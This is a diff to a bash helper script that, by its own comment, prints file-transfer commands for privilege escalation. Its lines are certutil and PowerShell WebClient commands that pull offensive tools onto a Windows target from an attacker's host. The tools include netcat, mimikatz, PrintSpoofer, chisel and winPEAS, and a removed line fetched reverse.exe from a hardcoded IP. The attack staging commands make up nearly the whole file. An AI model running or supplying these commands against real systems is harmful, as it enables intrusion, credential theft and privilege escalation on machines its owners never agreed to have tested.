@@ -2,6 +2,8 @@
 
 # display file transfer commands for priv-esc
 
+# usage: filetran [port]
+
 Frame='\033[0;32m'   # Green
 Link='\033[0;35m'  	 # Purple
 Title='\033[1;33m' 	 # Bold Yellow
@@ -19,7 +21,7 @@ if [ "$ip" == "" ]; then
 fi
 
 if [ -n "$port" ]; then
-	host="$ip:$1" # port is 80 by default
+	host="$ip:$1" # port is 80 by default (if apache2 is enabled)
 	runServer="true"
 fi
 
@@ -51,22 +53,32 @@ echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Windows Binaries${End} ${Frame}###${End}"
+echo -e "${Point} certutil -urlcache -f http://$host/wget.exe wget.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/nc.exe nc"
+echo -e "${Point} certutil -urlcache -f http://$host/nc64.exe nc64.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/whoami.exe whoami.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/accesschk.exe accesschk.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/plink.exe plink.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/chisel_windows_amd64.exe chisel_windows_amd64.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/winPEASany.exe winPEAS.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/mimikatz32.exe mimikatz32.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/mimikatz64.exe mimikatz64.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/PrintSpoofer32.exe PrintSpoofer32.exe"
+echo -e "${Point} certutil -urlcache -f http://$host/PrintSpoofer64.exe PrintSpoofer64.exe"
+echo -e ""
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/wget.exe','C:\\\Users\\\Public\\\Documents\\\wget.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc.exe','C:\\\Users\\\Public\\\Documents\\\nc.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/nc64.exe','C:\\\Users\\\Public\\\Documents\\\nc64.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/whoami.exe','C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/accesschk.exe','C:\\\Users\\\Public\\\Documents\\\accesschk.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/plink.exe','C:\\\Users\\\Public\\\Documents\\\plink.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/chisel_windows_amd64.exe','C:\\\Users\\\Public\\\Documents\\\chisel_windows_amd64.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/winPEASany.exe','C:\\\Users\\\Public\\\Documents\\\winPEAS.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/mimikatz32.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/mimikatz64.exe','C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato32.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato32.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/PrintSpoofer32.exe','C:\\\Users\\\Public\\\Documents\\\PrintSpoofer32.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$host/PrintSpoofer64.exe','C:\\\Users\\\Public\\\Documents\\\PrintSpoofer64.exe')"
 echo -e ""
-
-# certutil -urlcache -f http://192.168.49.201:443/reverse.exe reverse.exe
 
 
 echo -e "${Frame}###${End} ${Title}Transfer Through SMB Server${End} ${Frame}###${End}"
